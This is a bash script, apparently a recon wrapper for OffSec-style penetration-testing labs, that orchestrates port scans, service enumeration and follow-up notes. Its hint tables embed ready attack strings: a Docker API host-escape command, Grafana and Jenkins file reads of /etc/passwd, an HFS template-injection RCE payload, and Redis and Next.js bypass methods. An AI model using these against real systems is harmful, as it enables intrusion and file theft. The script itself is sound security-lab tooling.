#!/usr/bin/env bash
#==============================================================================
# OffSec RECON WRAPPER - Automated Enumeration Orchestrator
#==============================================================================
# Single-file design: no external modules to lose on engagement.
#
# WORKFLOW:
#   1. Fast TCP port discovery via rustscan
#   2. Targeted nmap service/version scan on found ports
#   3. UDP top-port scan (SNMP is OffSec gold)
#   4. Auto-launch service-specific enumeration based on findings
#   5. Generate summary report
#
# DESIGN DECISIONS:
#   - Single file: reliability > elegance on engagement
#   - Background jobs: enumeration runs in parallel so you can work
#   - Trap handlers: Ctrl+C kills children cleanly, no zombies
#   - Timeouts on everything: nothing hangs your engagement
#   - Idempotent: re-run safely; skips completed phases
#   - Structured output: easy to grep/review under pressure
#
# USAGE:
#   ./recon.sh <IP>                  # Single target
#   ./recon.sh <IP1> <IP2> <IP3>     # Multiple targets
#   ./recon.sh -f targets.txt        # File with one IP per line
#   ./recon.sh --auto <IP>           # Skip confirmation prompts
#   ./recon.sh --udp-ports 50 <IP>   # Custom UDP top-port count
#   ./recon.sh --udp-full <IP>        # Full 65535 UDP scan (when stuck)
#
# OUTPUT STRUCTURE:
#   recon/<IP>/
#   ├── scans/          # Raw nmap/rustscan output
#   ├── tcp/            # TCP service enumeration
#   │   ├── http/       # gobuster, nikto, whatweb
#   │   ├── smb/        # enum4linux-ng, smbmap, smbclient
#   │   ├── ftp/        # Anonymous login checks
#   │   ├── ssh/        # Version/key info
#   │   ├── snmp/       # snmpwalk, onesixtyone
#   │   ├── mysql/      # MySQL enumeration
#   │   ├── postgres/   # PostgreSQL enumeration
#   │   ├── dns/        # DNS enumeration
#   │   ├── smtp/       # SMTP user enumeration
#   │   └── rpc/        # RPC enumeration
#   ├── udp/            # UDP scan results and enumeration
#   ├── loot/           # Extracted creds, keys, interesting files
#   │   └── next_steps.txt  # Finding-driven follow-up command library
#   ├── progress.log    # What's done, what's running
#   └── summary.txt     # Quick-reference findings
#==============================================================================

set -o pipefail
set -u
# NOT set -e: we handle errors ourselves so one failure doesn't kill everything

#------------------------------------------------------------------------------
# CONFIGURATION — Tune these for your environment / engagement needs
#------------------------------------------------------------------------------
# Absolute dir of this script — used to emit PWD-independent commands that
# reference sibling toolkit scripts (webenum.sh, adr.sh, sprayr.sh, etc.).
# shellcheck disable=SC2034  # reserved for sibling-command emission
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Resolve workspace root — three-level priority:
#   1. Explicit TOOLKIT_ROOT already set in environment (user override)
#   2. Invoking user's home when running under sudo (prevents /root/toolkit after re-exec)
#   3. Current HOME as final fallback
if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
    if [[ -n "${SUDO_USER:-}" ]]; then
        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
        TOOLKIT_ROOT="${_inv_home:-$HOME}/toolkit"
        unset _inv_home
    else
        TOOLKIT_ROOT="${HOME}/toolkit"
    fi
fi
RECON_DIR="${TOOLKIT_ROOT}/recon"         # Base output directory
# When running as root via sudo, prepend invoking user's bin dirs so user-installed
# tools (rustscan in ~/.cargo/bin, etc.) are found regardless of secure_path.
if [[ $EUID -eq 0 ]] && [[ -n "${SUDO_USER:-}" ]]; then
    _inv_home_p=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
    if [[ -n "$_inv_home_p" ]]; then
        PATH="${_inv_home_p}/.cargo/bin:${_inv_home_p}/.local/bin:${_inv_home_p}/go/bin:${_inv_home_p}/snap/bin:${PATH}"
        export PATH
    fi
    unset _inv_home_p
fi
# Rustscan batch size — favor speed in an engagement lab VMs, floor at 100, cap at 5000
# to avoid "Too many open files" when ulimit is tight.
_ulimit_n=$(ulimit -n 2>/dev/null || echo 1024)
RUSTSCAN_BATCH_SIZE=4500
(( RUSTSCAN_BATCH_SIZE > _ulimit_n / 2 )) && RUSTSCAN_BATCH_SIZE=$(( _ulimit_n / 2 ))
(( RUSTSCAN_BATCH_SIZE < 100  )) && RUSTSCAN_BATCH_SIZE=100
(( RUSTSCAN_BATCH_SIZE > 5000 )) && RUSTSCAN_BATCH_SIZE=5000
unset _ulimit_n
RUSTSCAN_TIMEOUT=2000                  # Connection timeout in ms (lab VMs are close)
RUSTSCAN_OUTER_TIMEOUT=600             # Outer wall-clock timeout for full 65535 sweep
NMAP_DISCOVERY_TIMEOUT=1200            # Seconds for nmap full TCP fallback/discovery
NMAP_DISCOVERY_MIN_RATE=3000           # Full TCP fallback speed; tune lower on lossy links
NMAP_TCP_TIMEOUT=600                   # Seconds for TCP service scan
NMAP_UDP_QUICK_TIMEOUT=180             # Seconds for high-signal UDP ports before top-port scan
NMAP_UDP_TIMEOUT=900                   # Seconds for UDP scan (slow by nature)
UDP_TOP_PORTS=200                      # Top N UDP ports to scan (200 balances coverage vs speed)
UDP_QUICK_PORTS="53,67,68,69,111,123,135,137,138,161,162,500,514,520,623,1434,1900,4500"
GOBUSTER_THREADS=20                    # Directory brute threads (lighter for first-pass OffSec recon)
GOBUSTER_TIMEOUT=10                    # Per-request timeout seconds (--timeout flag)
GOBUSTER_RUNTIME=300                   # Max total runtime for the gobuster process
GOBUSTER_WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
GOBUSTER_EXTENSIONS="php,asp,aspx,txt,html"   # Trimmed for first-pass speed; add cgi,jsp,bak manually if needed
NIKTO_TIMEOUT=120                      # Seconds
FEROX_RUNTIME=300                      # Max total runtime for the feroxbuster process
ENUM4LINUX_TIMEOUT=300                 # Seconds
SMBMAP_TIMEOUT=120                     # Seconds
SNMPWALK_TIMEOUT=120                   # Seconds
FTP_TIMEOUT=30                         # Seconds
MYSQL_TIMEOUT=30                       # Seconds
GENERIC_TIMEOUT=120                    # Fallback timeout for misc tools
MAX_PARALLEL_SERVICES=5                # Max concurrent service enumerations per target
MAX_PARALLEL_TARGETS=3                 # Max targets scanned simultaneously
SEQUENTIAL_TARGETS=false               # Process targets one at a time
AUTO_MODE=false                        # Skip confirmation prompts
UDP_FULL=false                         # Scan all 65535 UDP ports (slow but thorough)
NO_SUDO=false                          # Skip sudo auto-reexec (pass --no-sudo to disable)
SNMP_COMMUNITY_STRINGS=("public" "private" "manager" "community")

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m' # No Color

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

# Timestamp for log entries
ts() { date '+%H:%M:%S'; }

info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*"; }
header()  { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; \
            echo -e "${BOLD}${CYAN}  $*${NC}"; \
            echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; }
phase()       { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }

# Heartbeat: emit a progress line every 30s while a long-running tool is executing,
# so the operator can tell the difference between "still working" and "stuck".
# Each subshell (parallel target) gets its own _HEARTBEAT_PID.
_HEARTBEAT_PID=""
_start_heartbeat() {
    # $1=tool, $2=ctx, $3=budget_sec
    local tool="$1" ctx="$2" budget="$3"
    local start
    start=$(date +%s)
    (
        while true; do
            sleep 30
            local now el
            now=$(date +%s)
            el=$(( now - start ))
            if (( el >= budget )); then
                echo -e "${YELLOW}[$(ts)] [~]${NC} ${tool} still running — over budget (${el}s / ${budget}s) → ${ctx}"
            else
                echo -e "${CYAN}[$(ts)] [~]${NC} ${tool} running (${el}s / ${budget}s) → ${ctx}"
            fi
        done
    ) &
    _HEARTBEAT_PID=$!
    register_cleanup_pid "$_HEARTBEAT_PID"
}
_stop_heartbeat() {
    if [[ -n "${_HEARTBEAT_PID:-}" ]]; then
        kill "$_HEARTBEAT_PID" 2>/dev/null || true
        wait "$_HEARTBEAT_PID" 2>/dev/null || true
        unregister_cleanup_pid "$_HEARTBEAT_PID"
        _HEARTBEAT_PID=""
    fi
}
_tool_start() {
    echo -e "${CYAN}[$(ts)] [~]${NC} ${BOLD}$1${NC} → $2  ${YELLOW}(budget: $3)${NC}"
    local _budget_sec
    _budget_sec=$(echo "$3" | grep -oE '^[0-9]+' | head -n1)
    if [[ -n "$_budget_sec" ]] && (( _budget_sec >= 60 )); then
        _start_heartbeat "$1" "$2" "$_budget_sec"
    fi
}
_tool_done() {
    _stop_heartbeat
    local _e=$(( $(date +%s) - $2 ))
    echo -e "${GREEN}[$(ts)] [✓]${NC} $1 done — ${_e}s"
}

#------------------------------------------------------------------------------
# PROGRESS TRACKING
# Each target gets a progress.log so you can resume or see what's done.
# Format: TIMESTAMP | STATUS | PHASE | DETAIL
#------------------------------------------------------------------------------
progress_log() {
    # $1=target_dir, $2=status(START|DONE|FAIL|SKIP), $3=phase, $4=detail
    local logfile="$1/progress.log"
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $2 | $3 | $4" >> "$logfile"
}

is_phase_done() {
    # Check if a phase already completed (for resume support)
    # $1=target_dir, $2=phase_name
    grep -qF "| DONE | $2 |" "$1/progress.log" 2>/dev/null
}

#------------------------------------------------------------------------------
# CHILD PROCESS MANAGEMENT
# Track all background PIDs so Ctrl+C cleans up everything.
#------------------------------------------------------------------------------
declare -a CHILD_PIDS=()
# Separate array for PIDs that need cleanup kills but do NOT count toward RUNNING_JOBS
# (e.g. the UDP background scan).
declare -a CLEANUP_ONLY_PIDS=()

# In-process set of phase keys already queued this target run.
# Prevents double-launch when two ports map to the same once-only module (e.g. 139+445→SMB).
declare -A QUEUED_PHASES=()

#------------------------------------------------------------------------------
# OffSec SERVICE-PORT KNOWLEDGE BASE
# One line per interesting service. Format:
#   [port]="name | CVE-or-hint | optional extra note"
# The generic emitter (emit_kb_port_hints) surfaces any of these that appear
# open on the target. To add coverage for a new service, append ONE line here —
# do NOT write a new enum module or next_steps stanza.
#
# Scope rule: only add services where (a) a named CVE or unauth primitive
# exists, or (b) the port is non-obvious (i.e. the user would not already
# recognize it from the default service list). Everything else is noise.
#------------------------------------------------------------------------------
declare -A OffSec_SERVICE_HINTS=(
  # --- Config management / orchestration ---
  [4505]="SaltStack master (ZMTP publisher) | CVE-2020-11651 + CVE-2020-11652 unauth RCE as root | salt-api on 8000/8080 | msf: exploit/linux/misc/saltstack_salt_api_cmd_exec"
  [4506]="SaltStack master (ZMTP request)   | CVE-2020-11651 + CVE-2020-11652 unauth RCE as root | pair with 4505"
  [2375]="Docker API (plain)   | unauth container escape | docker -H tcp://HOST:2375 run --rm -v /:/host alpine chroot /host sh"
  [2376]="Docker API (TLS)     | auth required, check for leaked certs"
  [6443]="Kubernetes API       | unauth /api/v1/pods, /version"
  [10250]="kubelet             | anon /runningpods, /exec — CVE-2018-1002105"
  # --- Messaging / queue ---
  [61616]="ActiveMQ OpenWire   | CVE-2023-46604 unauth RCE"
  [5672]="AMQP / RabbitMQ      | guest:guest default, mgmt UI on 15672"
  [15672]="RabbitMQ mgmt       | guest:guest default"
  [9092]="Kafka                | unauth topic list"
  [2181]="ZooKeeper            | 4lw cmds: echo mntr | nc HOST 2181 ; env, conf, stat"
  # --- App servers / mgmt ---
  [7001]="WebLogic             | T3/IIOP deserialization — CVE-2020-2555/14882/14750"
  [7002]="WebLogic SSL"
  [8009]="Tomcat AJP           | Ghostcat CVE-2020-1938 file read / RCE"
  [8161]="ActiveMQ web console | default admin:admin"
  [50070]="Hadoop NameNode WebUI | unauth /dfshealth, /logs"
  [50075]="Hadoop DataNode"
  # --- DB / KV / search ---
  [27017]="MongoDB             | no-auth: mongo HOST:27017 --eval 'db.adminCommand(\"listDatabases\")'"
  [5984]="CouchDB             | CVE-2017-12635/12636 admin create; _all_dbs"
  [9200]="Elasticsearch       | CVE-2015-1427 groovy RCE (pre-1.4.3); _cat/indices"
  [9300]="Elasticsearch cluster transport"
  [11211]="memcached          | stats, stats items; UDP amplification"
  [6379]="Redis              | no-auth RCE via MODULE LOAD / slaveof / authorized_keys write"
  [1521]="Oracle TNS         | odat all, sid brute, CVE-2012-1675"
  # --- Monitoring / mgmt UIs ---
  [3000]="Grafana            | CVE-2021-43798 path traversal (/public/plugins/ALERTLIST/../../../../etc/passwd)"
  [5601]="Kibana             | CVE-2018-17246 LFI; CVE-2019-7609 RCE"
  [9000]="Portainer/SonarQube/PHP-FPM | check banner; Portainer admin reset if uninit"
  [8834]="Nessus             | default admin only — check creds"
  # --- Remote access / oddballs ---
  [5985]="WinRM (HTTP)       | NTLM auth → evil-winrm"
  [5986]="WinRM (HTTPS)"
  [1099]="Java RMI           | CVE-2017-3241 deserialization, ysoserial"
  [8888]="Jupyter notebook   | unauth /tree = RCE via new notebook"
  [9090]="Prometheus/Cockpit | unauth metrics, config leak"
  [5000]="UPnP/Flask/Docker registry (v1) | /v2/_catalog for registry"
)

#------------------------------------------------------------------------------
# OffSec HTTP-HEADER KNOWLEDGE BASE
# Parallel to OffSec_SERVICE_HINTS but keyed on case-insensitive regex matched
# against each HTTP port's curl_headers.txt. Catches services exposed on
# non-default ports where the port KB would miss them (e.g. salt-api on :8000
# pairing with the master on :4505/:4506 — observed on Twiggy 192.168.227.62).
#
# Format: ["header-regex"]="name | CVE-or-hint | optional extra note"
# To add a new product, append ONE line here — no new parser needed.
#
# Scope rule: only include header signatures that UNIQUELY name a product
# (e.g. X-Jenkins:, Server: MiniServ). Broad markers like "Content-Type:
# application/json" go in the generic quick-wins path, not here.
#------------------------------------------------------------------------------
declare -A OffSec_HTTP_HEADER_HINTS=(
  ["X-Upstream:[[:space:]]*salt-api"]="SaltStack salt-api | CVE-2020-11651 + CVE-2020-11652 unauth RCE as root | pair with 4505/4506 | msf: exploit/linux/misc/saltstack_salt_api_cmd_exec"
  ["X-Jenkins:"]="Jenkins | CVE-2024-23897 unauth arbitrary file read (<2.442 / LTS <2.426.3) | jnlpJars/jenkins-cli.jar connect-node @/etc/passwd"
  ["X-Hudson:"]="Jenkins (Hudson legacy) | same as X-Jenkins — try CVE-2024-23897"
  ["X-Gitlab-Meta:"]="GitLab | CVE-2023-7028 unauth account takeover via password_reset (16.1.0-16.7.1)"
  ["X-Confluence-Request-Time:"]="Atlassian Confluence | CVE-2023-22527 OGNL unauth RCE (8.0.0-8.5.3)"
  ["Server:[[:space:]]*Apache-Coyote"]="Apache Tomcat | default creds tomcat/tomcat, manager/html WAR deploy"
  ["Server:[[:space:]]*MiniServ"]="Webmin | CVE-2019-15107 unauth RCE via password_change.cgi"
  ["Server:[[:space:]]*HFS"]="Rejetto HFS | CVE-2024-23692 unauth template RCE (2.3m-2.4) via ?search=%00{.exec|CMD.}"
  ["X-Powered-By:[[:space:]]*Werkzeug"]="Werkzeug debugger | if PIN-less or leaked → RCE via /console"
  ["X-Powered-By:[[:space:]]*Next\\.js"]="Next.js | CVE-2025-29927 middleware auth bypass (<14.2.25 / <15.2.3) via x-middleware-subrequest header"
  ["X-Powered-By:[[:space:]]*Express"]="Express.js | check for CVE-2024-29041 open-redirect and verb-tampering"
  ["X-Powered-By:[[:space:]]*PHP/[45]"]="End-of-life PHP | check for CVE-2019-11043 php-fpm RCE, CVE-2012-1823 php-cgi argv"
  ["Set-Cookie:[[:space:]]*grafana_session"]="Grafana | CVE-2021-43798 path traversal (v8.0.0–8.3.0) via /public/plugins/<plugin>/../../../../etc/passwd | also check :3000 port for R7 dedicated stanza"
)

#------------------------------------------------------------------------------
# WEBENUM STANZA MARKER MAP
# When emit_kb_header_hints fingerprints a CMS/app at recon time, we want to
# point the operator at the webenum-generated next_steps.txt section instead of
# falling back to generic searchsploit. Key = lowercase substring of the KB
# name; value = literal heading text webenum emits in its own next_steps.txt
# (see webenum generate_next_steps). Empty value means "handled by a dedicated
# recon stanza already — skip the webenum lookup" (e.g. SaltStack → R1).
#------------------------------------------------------------------------------
declare -A WEBENUM_STANZA_MARKERS=(
  [jenkins]="Jenkins detected"
  [webmin]="Webmin detected"
  [tomcat]="Tomcat manager surface detected"
  [coyote]="Tomcat manager surface detected"
  [confluence]="Atlassian Confluence detected"
  [gitlab]="GitLab detected"
  [hfs]="Rejetto HFS"
  [rejetto]="Rejetto HFS"
  [next.js]="Next.js detected"
  [nextjs]="Next.js detected"
  [werkzeug]="Debug framework indicators"
  [grafana]="Grafana detected"
  [saltstack]=""
)

# Generic KB emitter — reads OffSec_SERVICE_HINTS, emits ONE next_steps stanza per
# open port that matches. Evidence is the port being open (from nmap_tcp.nmap).
emit_kb_port_hints() {
    local ip="$1"
    local target_dir="$2"
    local next_file="$3"
    local p
    for p in "${!OffSec_SERVICE_HINTS[@]}"; do
        detected_tcp_port "$target_dir" "$p" || continue
        local hint="${OffSec_SERVICE_HINTS[$p]}"
        local name
        name=$(echo "$hint" | awk -F'|' '{print $1}' | awk '{$1=$1};1')
        local proto="http"
        case "$p" in 443|8443|4443|9443|5986) proto="https" ;; esac
        # Surface the KB line verbatim; give the operator generic next-moves.
        append_next_finding "$next_file" \
            "KB hint — :$p ($name)" \
            "nmap_tcp.nmap shows port $p open" \
            "# KB entry: $hint" \
            "searchsploit $(echo "$name" | awk '{print $1, $2}' | sed 's/ *$//')" \
            "nc -nv $ip $p </dev/null" \
            "curl -sk ${proto}://$ip:$p/ | head -20" \
            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §2 Service / Network Path"
        # Also surface in quick_wins for at-a-glance triage.
        quick_win "$target_dir" "KB: :$p — $hint" "grep -P '^$p/tcp\\s+open' $target_dir/scans/nmap_tcp.nmap"
    done
}

# Generic HTTP-header KB emitter — iterates every port's curl_headers.txt and
# applies OffSec_HTTP_HEADER_HINTS. One stanza per (port, matching header).
emit_kb_header_hints() {
    local ip="$1"
    local target_dir="$2"
    local next_file="$3"
    local headers_file port_dir port proto hdr_pattern hint name
    for headers_file in "$target_dir"/tcp/http/port_*/curl_headers.txt; do
        [[ -s "$headers_file" ]] || continue
        port_dir=$(dirname "$headers_file")
        port=$(basename "$port_dir" | sed 's/^port_//')
        [[ "$port" =~ ^[0-9]+$ ]] || continue
        proto="http"
        case "$port" in 443|8443|4443|9443) proto="https" ;; esac
        for hdr_pattern in "${!OffSec_HTTP_HEADER_HINTS[@]}"; do
            if grep -qiE "$hdr_pattern" "$headers_file" 2>/dev/null; then
                hint="${OffSec_HTTP_HEADER_HINTS[$hdr_pattern]}"
                name=$(echo "$hint" | awk -F'|' '{print $1}' | awk '{$1=$1};1')
                # Look up webenum's dedicated stanza for this app. If webenum has
                # already been run against this IP:port, point at the captured
                # handoff instead of falling back to a generic searchsploit.
                local name_lc marker_key web_stanza_marker="" web_next web_host
                name_lc="${name,,}"
                web_stanza_marker=""
                for marker_key in "${!WEBENUM_STANZA_MARKERS[@]}"; do
                    if [[ "$name_lc" == *"$marker_key"* ]]; then
                        web_stanza_marker="${WEBENUM_STANZA_MARKERS[$marker_key]}"
                        break
                    fi
                done
                web_host="$ip"
                web_next="${TOOLKIT_ROOT:-$HOME/toolkit}/web/${web_host}_${port}_${proto}/artifacts/loot/next_steps.txt"
                if [[ -n "$web_stanza_marker" ]] && is_nonempty_file "$web_next" && \
                    grep -q "^## .*${web_stanza_marker}" "$web_next" 2>/dev/null; then
                    append_next_finding "$next_file" \
                        "HTTP header fingerprint :$port — $name (see webenum handoff)" \
                        "$headers_file matched $hdr_pattern; webenum captured full handoff at $web_next" \
                        "# KB entry: $hint" \
                        "# Full exploit chain lives in webenum output — read it:" \
                        "awk '/^## .*${web_stanza_marker}/,/^## /' \"$web_next\" | sed '\$d'" \
                        "less +/'^## .*${web_stanza_marker}' \"$web_next\"" \
                        "cat \"$headers_file\"" \
                        "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference"
                else
                    append_next_finding "$next_file" \
                        "HTTP header fingerprint :$port — $name" \
                        "$headers_file matched header pattern: $hdr_pattern (webenum handoff not present)" \
                        "# KB entry: $hint" \
                        "# Run webenum to generate the full exploit chain for this app:" \
                        "./webenum.sh --url ${proto}://${web_host}:${port}" \
                        "searchsploit $(echo "$name" | awk '{print $1, $2}' | sed 's/ *$//')" \
                        "cat \"$headers_file\"" \
                        "curl -sk ${proto}://$ip:$port/ | head -20" \
                        "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference"
                fi
                quick_win "$target_dir" "HTTP-HDR: :$port — $hint" "curl -skIL ${proto}://$ip:$port/  # headers matched /$hdr_pattern/"
            fi
        done
    done
}

register_pid() {
    CHILD_PIDS+=("$1")
}

register_cleanup_pid() {
    CLEANUP_ONLY_PIDS+=("$1")
}

unregister_cleanup_pid() {
    local remove_pid="$1"
    local new_pids=()
    local pid=""
    for pid in ${CLEANUP_ONLY_PIDS[@]+"${CLEANUP_ONLY_PIDS[@]}"}; do
        if [[ "$pid" != "$remove_pid" ]]; then
            new_pids+=("$pid")
        fi
    done
    CLEANUP_ONLY_PIDS=("${new_pids[@]+"${new_pids[@]}"}")
}

# Semaphore for limiting parallel jobs
declare -i RUNNING_JOBS=0

wait_for_slot() {
    while (( RUNNING_JOBS >= MAX_PARALLEL_SERVICES )); do
        # Reap any finished children to avoid zombies
        local new_pids=()
        for pid in ${CHILD_PIDS[@]+"${CHILD_PIDS[@]}"}; do
            if kill -0 "$pid" 2>/dev/null; then
                new_pids+=("$pid")
            else
                wait "$pid" 2>/dev/null || true
                (( RUNNING_JOBS-- )) || true
            fi
        done
        CHILD_PIDS=("${new_pids[@]+"${new_pids[@]}"}")
        if (( RUNNING_JOBS >= MAX_PARALLEL_SERVICES )); then
            sleep 1
        fi
    done
}

# Launch a background enumeration function with slot management
launch_enum() {
    # $1=function_name, remaining args passed to function
    wait_for_slot
    "$@" &
    local pid=$!
    register_pid "$pid"
    (( RUNNING_JOBS++ )) || true
    info "Launched $1 (PID: $pid)"
}

# Wait for all background enumerations, reporting every 30s so the user knows what's running
wait_all_enum() {
    if (( ${#CHILD_PIDS[@]} > 0 )); then
        local _total=${#CHILD_PIDS[@]}
        info "Waiting for $_total background job(s) to finish..."
        local _w0
        _w0=$(date +%s)
        local _last_report=0
        while (( ${#CHILD_PIDS[@]} > 0 )); do
            local _alive=()
            local _pid
            for _pid in ${CHILD_PIDS[@]+"${CHILD_PIDS[@]}"}; do
                if kill -0 "$_pid" 2>/dev/null; then
                    _alive+=("$_pid")
                else
                    wait "$_pid" 2>/dev/null || true
                fi
            done
            CHILD_PIDS=("${_alive[@]+"${_alive[@]}"}")
            (( ${#CHILD_PIDS[@]} == 0 )) && break
            local _el=$(( $(date +%s) - _w0 ))
            if (( _el - _last_report >= 30 )); then
                info "  ${#CHILD_PIDS[@]}/${_total} job(s) still running... (${_el}s elapsed)"
                _last_report=$_el
            fi
            sleep 2
        done
        local _waited=$(( $(date +%s) - _w0 ))
        (( _waited > 2 )) && success "All background jobs finished (waited ${_waited}s)"
    fi
    CHILD_PIDS=()
    RUNNING_JOBS=0
}

#------------------------------------------------------------------------------
# CLEANUP TRAP — kill all children on exit/interrupt
#------------------------------------------------------------------------------
CLEANUP_RUNNING=0

cleanup() {
    local exit_code="${1:-0}"
    (( CLEANUP_RUNNING )) && return
    CLEANUP_RUNNING=1
    trap - EXIT INT TERM

    local pid=""
    for pid in ${CHILD_PIDS[@]+"${CHILD_PIDS[@]}"} ${CLEANUP_ONLY_PIDS[@]+"${CLEANUP_ONLY_PIDS[@]}"}; do
        if kill -0 "$pid" 2>/dev/null; then
            kill -TERM "$pid" 2>/dev/null || true
        fi
    done
    sleep 1
    for pid in ${CHILD_PIDS[@]+"${CHILD_PIDS[@]}"} ${CLEANUP_ONLY_PIDS[@]+"${CLEANUP_ONLY_PIDS[@]}"}; do
        if kill -0 "$pid" 2>/dev/null; then
            kill -9 "$pid" 2>/dev/null || true
        fi
    done

    if (( exit_code == 130 )); then
        echo ""
        warn "Interrupted — partial results are in ${RECON_DIR:-[not initialized]}/"
    fi
    exit "$exit_code"
}

trap 'cleanup 0'   EXIT
trap 'cleanup 130' INT TERM

#------------------------------------------------------------------------------
# INPUT VALIDATION
#------------------------------------------------------------------------------
is_valid_ip() {
    local ip="$1"
    # Accept IPv4. Also accept hostnames (useful for OffSec boxes).
    if [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        # Validate each octet
        IFS='.' read -ra octets <<< "$ip"
        for octet in "${octets[@]}"; do
            (( octet > 255 )) && return 1
        done
        return 0
    elif [[ "$ip" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$ ]]; then
        # Hostname format — must resolve via DNS or /etc/hosts
        if getent hosts "$ip" >/dev/null 2>&1; then
            return 0
        fi
        return 1
    fi
    return 1
}

check_tool() {
    if command -v "$1" &>/dev/null; then
        return 0
    else
        warn "Tool not found: $1 (some enumeration will be skipped)"
        return 1
    fi
}

is_positive_integer() {
    [[ "$1" =~ ^[1-9][0-9]*$ ]]
}

#------------------------------------------------------------------------------
# PORT CLASSIFICATION HELPERS
#------------------------------------------------------------------------------
is_http_port() {
    local port="$1"
    local service="$2"
    # Match by common port numbers OR by nmap service name
    case "$port" in
        80|443|8080|8443|8000|8888|8081|9090|3000|5000|8180|4443|9443) return 0 ;;
    esac
    [[ "$service" =~ http|https|ssl/http|web ]] && return 0
    return 1
}

is_ssl_port() {
    local port="$1"
    local service="$2"
    case "$port" in
        443|8443|4443|9443) return 0 ;;
    esac
    [[ "$service" =~ ssl|https|tls ]] && return 0
    return 1
}

is_web_brute_target() {
    # Returns 1 for HTTP-like management ports that are not real web apps.
    # WinRM (5985/5986) and Windows HTTPAPI (47001) respond to HTTP requests
    # but have no web content worth brute-forcing — nikto/gobuster/ferox waste
    # minutes on them and find nothing meaningful.
    local port="$1"
    case "$port" in
        5985|5986|47001) return 1 ;;
    esac
    return 0
}

is_nonempty_file() {
    [[ -f "$1" && -s "$1" ]]
}

tcp_service_lines() {
    local target_dir="$1"
    [[ -f "$target_dir/scans/nmap_tcp.nmap" ]] || return 0
    grep -P '^\d+/tcp\s+open\s' "$target_dir/scans/nmap_tcp.nmap" 2>/dev/null || true
}

detected_tcp_port() {
    local target_dir="$1"
    local port="$2"
    tcp_service_lines "$target_dir" | grep -qP "^${port}/tcp\s+open\s"
}

first_detected_port() {
    local target_dir="$1"
    local pattern="$2"
    tcp_service_lines "$target_dir" | awk -v pat="$pattern" 'BEGIN{IGNORECASE=1} $0 ~ pat {sub(/\/tcp.*/, "", $1); print $1; exit}'
}

append_next_finding() {
    local next_file="$1"
    local title="$2"
    local evidence="$3"
    shift 3

    {
        echo "## ${title}"
        echo "Evidence: ${evidence}"
        local cmd
        for cmd in "$@"; do
            [[ -n "$cmd" ]] && echo "$cmd"
        done
        echo ""
    } >> "$next_file"
}

# Append a timestamped command invocation to this target's cmd_log.txt.
# Provides OffSec-report-grade "what command ran" evidence for every tool
# that materially produced a finding. Silent on missing target_dir.
cmd_log() {
    local td="$1"; shift
    [[ -z "${td:-}" ]] && return 0
    local cmd_str="$*"
    local log="$td/cmd_log.txt"
    mkdir -p "$td" 2>/dev/null || true
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $cmd_str" >> "$log" 2>/dev/null || true
}

# Append a finding to quick_wins.txt AND mirror the producing command
# into cmd_log.txt so the OffSec report can cite command/output pairs.
# $1 = target_dir, $2 = finding text (downstream greps key off this),
# $3 = producing command (optional but strongly recommended).
# Format is single-line "<finding>  | cmd: <command>" so it survives the
# sort -u pass in generate_quick_wins without scrambling finding/cmd pairs.
quick_win() {
    local td="$1"
    local text="$2"
    local cmd="${3:-}"
    local qw="$td/loot/quick_wins.txt"
    mkdir -p "$td/loot" 2>/dev/null || true
    if [[ -n "$cmd" ]]; then
        printf '%s  | cmd: %s\n' "$text" "$cmd" >> "$qw" 2>/dev/null || true
        cmd_log "$td" "$cmd  # produced: $text"
    else
        printf '%s\n' "$text" >> "$qw" 2>/dev/null || true
    fi
}

# Same as quick_win but writes to a caller-specified file — used by
# generate_quick_wins which stages into a tmp_file before atomic replace.
quick_win_to() {
    local td="$1"
    local dest="$2"
    local text="$3"
    local cmd="${4:-}"
    mkdir -p "$(dirname "$dest")" 2>/dev/null || true
    if [[ -n "$cmd" ]]; then
        printf '%s  | cmd: %s\n' "$text" "$cmd" >> "$dest" 2>/dev/null || true
        cmd_log "$td" "$cmd  # produced: $text"
    else
        printf '%s\n' "$text" >> "$dest" 2>/dev/null || true
    fi
}

http_proto_for_port() {
    local port="$1"
    case "$port" in
        443|8443|4443|9443|5986) echo "https" ;;
        *) echo "http" ;;
    esac
}

#------------------------------------------------------------------------------
# QUICK-WINS TRIAGE — 5-minute fast check per target
#------------------------------------------------------------------------------
QUICK_WINS_MODE=false
QUICK_WINS_ONLY=false

# Score tracking: associative array ip→score
declare -A QW_SCORES=()
declare -A QW_REASONS=()

qw_triage_target() {
    local ip="$1"
    local target_dir="${RECON_DIR}/${ip}"
    local qw_file="${target_dir}/loot/quick_wins.txt"
    local score=0
    local reasons=""

    mkdir -p "$target_dir"/{scans,loot}

    phase "Quick-Wins Triage → ${ip}"

    # 1. Fast nmap scan (top 100 ports, version detect, 90s timeout)
